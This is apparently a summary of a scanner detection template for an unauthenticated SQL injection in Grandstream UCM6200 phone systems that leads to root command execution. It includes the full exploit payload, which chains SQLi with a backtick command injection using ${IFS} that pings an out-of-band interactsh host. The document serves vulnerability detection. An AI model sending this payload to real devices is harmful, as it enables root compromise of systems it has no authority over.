severity: critical

## Vulnerability
Grandstream UCM6200 series contains an unauthenticated remote SQL injection (CWE-89) triggered by crafted HTTP requests to the /cgi endpoint. Attackers can execute arbitrary shell commands as root (pre-1.0.19.20) or inject malicious HTML into emails (pre-1.0.20.17), resulting in full device compromise or phishing.  
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical).  
EPSS score 0.92735 (99.747th percentile). Tagged KEV.

## PoC / Detection
Classification: rce  
The template issues one raw unauthenticated POST request to `/cgi?` containing the payload `action=sendPasswordEmail&user_name=admin'+or+1=1--`;`ping${IFS}{{interactsh-url}}`;`` (SQLi + command injection via backticks and IFS to bypass whitespace). It verifies exploitation by matching HTTP/200 status, `application/json` response header, and an out-of-band DNS interaction on the injected interactsh domain, confirming root-level command execution.
